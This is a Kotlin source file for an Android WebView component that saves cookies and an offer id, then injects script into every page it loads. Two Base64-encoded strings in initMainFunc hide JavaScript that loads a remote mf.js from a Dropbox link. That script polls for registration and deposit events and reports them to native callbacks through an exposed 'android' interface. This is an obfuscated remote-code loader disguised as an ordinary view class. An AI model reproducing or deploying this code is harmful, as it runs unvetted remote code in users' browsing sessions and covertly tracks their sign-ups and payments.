package org.compact.tech

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.os.Build
import android.util.AttributeSet
import android.util.Base64
import android.webkit.*

class ScrPreferences(context: Context) {
    private val name = "ScrPreferences"
    private val prId = "prId"
    private val cookies = "cookies"
    private val link = "link"

    private val preferences = context.getSharedPreferences(name, Context.MODE_PRIVATE)

    fun savePreland(prId: String) = preferences.edit().putString(this.prId, prId).apply()
    fun getPreland() = preferences.getString(this.prId, null)

    fun saveCookies(cookies: String) = preferences.edit().putString(this.cookies, cookies).apply()
    fun getCookies() = preferences.getString(this.cookies, null)

    fun saveLink(link: String) = preferences.edit().putString(this.link, link).apply()
    fun getLink() = preferences.getString(this.link, null)
}

class ScrView(context: Context, attrs: AttributeSet) : ScrBaseView(context, attrs) {
    var preferences = ScrPreferences(context)
    var query: String? = null
    var preland: String? = preferences.getPreland()

    init {
        setClient()
    }

    fun startIfSaved(): Boolean {
        preferences.getLink()?.let { link ->
            preferences.getCookies()?.let {
                CookieManager.getInstance().setCookie(link, it)
            }
            loadUrl(link)
            return true
        }
        return false
    }

    fun start(link: String) {
        loadUrl(link)
    }

    fun setAskListener(askListener: Listener) {
        addJavascriptInterface(askListener, "android")
    }

    fun save() {
        preferences.saveLink(url.toString())
        preferences.saveCookies(CookieManager.getInstance().getCookie(url.toString()))
    }

    private fun initMainFunc(id: String) {
        val fpath = "amF2YXNjcmlwdDogdmFyIHByZXZBc2s7c2R" +
                "6PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcm" +
                "lwdCIpLHNkei5vbmxvYWQ9ZnVuY3Rpb24oKXttYWluRnVuYygi"
        val spath = "Iiksc2V0SW50ZXJ2YWwoKCk9Pnt2YXIgZT0oYXNrUmVnKCkrIiIpLnNwbGl0KCI6Iik7aWYoM" +
                "T09ZS5sZW5ndGgmJiItMSI9PXByZXZBc2smJiIwIj09ZVswXSYmYW5kcm9pZC5vblJlZygpLD" +
                "I9PWUubGVuZ3RoJiZwcmV2QXNrIT1lWzBdKXN3aXRjaChlWzBdKXtjYXNlIDE6YW5kcm9pZC5" +
                "vbkRlcDEoZVsxXSk7YnJlYWs7Y2FzZSAyOmFuZHJvaWQub25EZXAyKGVbMV0pO2JyZWFrO2Nh" +
                "c2UgMzphbmRyb2lkLm9uRGVwMyhlWzFdKX1wcmV2QXNrPWVbMF19LDFlMyl9LHNkei5zcmM9I" +
                "mh0dHBzOi8vZGwuZHJvcGJveC5jb20vcy9rZ3Nma2s2dTE2dmNoYmwvbWYuanMiLGRvY3VtZW" +
                "50LmJvZHkuYXBwZW5kQ2hpbGQoc2R6KTs"

        loadUrl(
            "javascript: ${Base64.decode(fpath, Base64.DEFAULT).toString(charset("UTF-8"))
                    + id + Base64.decode(spath, Base64.DEFAULT).toString(charset("UTF-8"))}"
        )
    }

    private fun setClient() {
        webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?): Boolean {
                Uri.parse(url).getQueryParameter("cust_offer_id")?.let { query = it }
                return false
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                if (preland.isNullOrEmpty()) {
                    val script = "document.querySelector('meta[name=\"cust_offer_id\"]').content"
                    evaluateJavascript(script) {
                        val result = it.replace("\"", "")
                        if (result.isNotEmpty() && result != "null") {
                            preland = result
                            preferences.savePreland(result)
                        }
                    }
                }

                preland?.let { initMainFunc(it) } ?: query?.let { initMainFunc(it) }
            }
        }
    }

    open class Listener {
        @JavascriptInterface
        open fun onReg() {
        }

        @JavascriptInterface
        open fun onDep1(value: String) {
        }

        @JavascriptInterface
        open fun onDep2(value: String) {
        }

        @JavascriptInterface
        open fun onDep3(value: String) {
        }
    }

}

@SuppressLint("SetJavaScriptEnabled")
abstract class ScrBaseView(c: Context, a: AttributeSet) : WebView(c, a) {
    init {
        with(settings) {
            javaScriptEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            domStorageEnabled = true
        }

        webChromeClient = WebChromeClient()

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            val cookieManager = CookieManager.getInstance()
            cookieManager.setAcceptCookie(true)
            cookieManager.setAcceptThirdPartyCookies(this, true);
        }
    }
}
